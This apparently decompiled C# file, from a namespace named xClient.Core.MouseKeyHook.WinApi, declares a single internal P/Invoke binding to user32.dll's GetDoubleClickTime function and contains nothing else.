using System;
using System.Runtime.InteropServices;

namespace xClient.Core.MouseKeyHook.WinApi
{
	// Token: 0x0200007D RID: 125
	internal static class MouseNativeMethods
	{
		// Token: 0x0600033A RID: 826
		[DllImport("user32.dll")]
		internal static extern int GetDoubleClickTime();
	}
}
